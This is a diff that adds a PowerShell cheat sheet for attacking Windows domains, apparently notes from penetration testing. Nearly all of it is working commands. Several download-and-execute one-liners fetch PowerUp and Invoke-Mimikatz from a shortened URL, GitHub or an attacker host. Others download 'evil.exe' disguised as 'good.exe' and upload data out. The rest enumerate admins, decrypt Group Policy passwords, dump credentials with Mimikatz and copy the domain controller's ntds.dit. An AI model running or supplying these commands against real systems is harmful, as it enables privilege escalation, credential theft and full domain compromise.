@@ -1,0 +1,105 @@
+PowerShell - How To
+
+
+# Priv escalation
+
+- Load from disk
+Import-Module PowerUp.ps1
+Invoke-AllChecks
+
+- Load from GitHub
+"IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/1PdjSHk');Invoke-PowerUp"
+Invoke-AllChecks
+
+- Load from Kali
+cd /opt/Empire/data/module_source/privesc/
+python -m SimpleHTTPServer
+
+- Windows
+"IEX (New-Object Net.WebClient).DownloadString('http://172.16.16.214:8000/PowerUp.ps1');Invoke-PowerUp"
+Invoke-AllChecks
+------------------------------------------------------------------------------------------------------
+
+# Dump creds
+
+- Load from GitHub
+"IEX (New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz"
+
+- Load from Kali
+cd /opt/Empire/data/module_source/credentials/
+python -m SimpleHTTPServer
+
+- Windows
+"IEX (New-Object Net.WebClient).DownloadString('http://172.16.16.214:8000/Invoke-Mimikatz.ps1');Invoke-Mimikatz"
+------------------------------------------------------------------------------------------------------
+
+# Open fileshares
+
+Import-Module powerview.ps1
+Invoke-ShareFinder -CheckShareAccess
+
+New-PSDrive S -PSProvider FileSystem -Root \\10.0.0.14\SYSVOL
+PSDrive
+Remove-PSDrive S
+------------------------------------------------------------------------------------------------------
+
+# Download file
+IEX(New-Object System.Net.Webclient).DownloadString(‘http://10.0.0.10/evil.ps1’)
+
+# Download file to disk
+IEX(New-Object System.Net.Webclient).DownloadFile(‘http://10.1.1.100/evil.exe’, ‘good.exe’)
+
+# Upload file
+IEX(New-Object System.Net.Webclient).UploadString(‘http://10.0.0.10/evil.ps1’,”<PostDATA>”)
+------------------------------------------------------------------------------------------------------
+
+# Who are your admins
+
+Import-Module powerview.ps1
+Get-NetGroups *admin* | Get-NetGroup -Recurse
+------------------------------------------------------------------------------------------------------
+
+# Where are your admins
+
+Import-Module powerview.ps1
+Invoke-UserHunter -ShowAll
+------------------------------------------------------------------------------------------------------
+
+# Old user passwords
+
+Import-Module powerview.ps1
+Get-NetUser | ? {$_.whenchanged -lt (Get-Date).AddMonths(-12)} | % {$_.samaccountname}
+------------------------------------------------------------------------------------------------------
+
+# Who can admin your DC?
+
+Import-Module powerview.ps1
+Get-NetDomainControllers | Get-NetLocalGroup
+------------------------------------------------------------------------------------------------------
+
+# Extract passwords from Group Policy
+
+Import-Module PowerSploit.ps1
+Get-GPPPassword
+
+\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\
+Search xml files for cpassword.
+GetDecryptedCpassword 'AES 256-bit encrypted password'
+------------------------------------------------------------------------------------------------------
+
+# Dump the DC database
+
+Import-Module PowerView
+Invoke-UserHunter
+Import-Module PowerSploit
+Invoke-Mimikatz -ComputerName <name>
+
+Open a new PS window as Administrator.
+Use the creds you just found.
+
+Import-Module PowerView
+Get-NetDomainController
+Import-Module PowerSploit
+Invoke-NinjaCopy -Path C:\windows\ntds\ntds.dit -LocalDistination C:\ntds.dit -ComputerName <DC name>
+ls
+
